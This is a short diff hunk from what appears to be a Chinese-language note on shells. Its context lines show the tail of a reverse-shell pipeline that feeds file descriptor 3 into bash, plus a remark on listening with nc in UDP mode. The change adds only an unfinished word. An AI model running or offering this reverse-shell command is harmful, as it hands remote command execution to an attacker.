@@ -69,3 +69,5 @@ echo Welcom back
 cat 0<&3 | bash | while read line;do echo $line;done
 ```
 nc监听指定-u参数
+
+按照
